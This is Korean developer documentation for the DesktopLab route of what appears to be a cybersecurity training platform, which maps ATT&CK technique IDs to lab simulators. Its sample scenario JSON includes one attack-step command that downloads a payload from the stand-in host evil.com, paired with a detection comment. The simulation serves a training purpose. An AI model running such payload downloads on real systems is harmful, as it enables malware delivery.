# 07. DesktopLab - 데스크톱 랩 라우터

## Meta
| Key | Value |
|-----|-------|
| Route | `/lab/desktop/:techniqueId/:level` |
| File | `src/pages/lab/DesktopLab.jsx` |
| Auth Required | Yes (→ /login?redirect=...) |
| Version | v0.9.2 (레벨 파라미터 추가) |

## Purpose
랩 실습의 진입점. 테크닉 ID에 따라 적절한 시뮬레이터로 라우팅.
전용 랩(DEDICATED_LABS) 또는 범용 시뮬레이터(GenericLabSimulator)로 분기.

## Dependencies
```javascript
import { useAuth } from '../../context/AuthContext';
import GenericLabSimulator from './GenericLabSimulator';
// Dynamic: SCENARIO_LOADERS (54+ techniques → JSON import)
```

## Routing Logic
```javascript
// 전용 랩 매핑
const DEDICATED_LABS = {
  'T1078.002': '/lab/t1078',  // Domain Accounts 전용 BloodHound UI
};

// 시나리오 로더 매핑 (54개)
const SCENARIO_LOADERS = {
  'T1587.001': () => import('../../data/lab-scenarios/T1587.001.json'),
  'T1589.003': () => import('../../data/lab-scenarios/T1589.003.json'),
  // ... 54개 매핑
};
```

## State Variables
```javascript
const { techniqueId, level } = useParams();
const { isLoggedIn, loading: authLoading } = useAuth();
const [authChecked, setAuthChecked] = useState(false);
const [scenario, setScenario] = useState(null);
const [loading, setLoading] = useState(true);
```

## Flow
```
Mount
  ↓ Auth Gate: !isLoggedIn → navigate('/login?redirect=...')
  ↓
  ↓ DEDICATED_LABS[techniqueId] 확인
  ├─ 있으면 → navigate('/lab/t1078', { replace: true })
  │
  ↓ SCENARIO_LOADERS[techniqueId] 확인
  ├─ 있으면 → dynamic import JSON → setScenario(data)
  │           → <GenericLabSimulator scenario={data} techniqueId={id} />
  │
  └─ 없으면 → 폴백 화면 (시나리오 미존재)
```

## lab-scenarios/ Directory
```
총 186개 JSON 파일
매핑된 로더: 54개 (SCENARIO_LOADERS에 등록)
파일 크기: 평균 ~15KB (steps 배열 길이에 따라 다름)

파일명 패턴: {techniqueId}.json
예: T1587.001.json, T1566.001.json, T1078.002.json
```

## Scenario JSON Structure
```json
{
  "id": "T1587.001",
  "title": "악성코드 개발 시뮬레이션",
  "titleEn": "Malware Development Simulation",
  "duration": 480,
  "stepDuration": 8,
  "steps": [
    {
      "action": "Initial Access",
      "output": "$ wget http://evil.com/payload.exe",
      "command": "wget http://evil.com/payload.exe",
      "userMessage": "공격자가 페이로드를 다운로드합니다",
      "defenseComment": "IDS에서 외부 다운로드 탐지됨",
      "ttsText": "공격자가 악성 페이로드를 원격 서버에서 다운로드합니다"
    }
  ],
  "phases": [
    { "name": "정찰", "startStep": 0, "endStep": 3 },
    { "name": "침투", "startStep": 4, "endStep": 8 }
  ],
  "processTree": [
    { "pid": 1, "name": "explorer.exe", "children": [2, 3] },
    { "pid": 2, "name": "cmd.exe" }
  ],
  "desktopIcons": [
    { "name": "Terminal", "icon": "terminal" },
    { "name": "Files", "icon": "folder" }
  ]
}
```
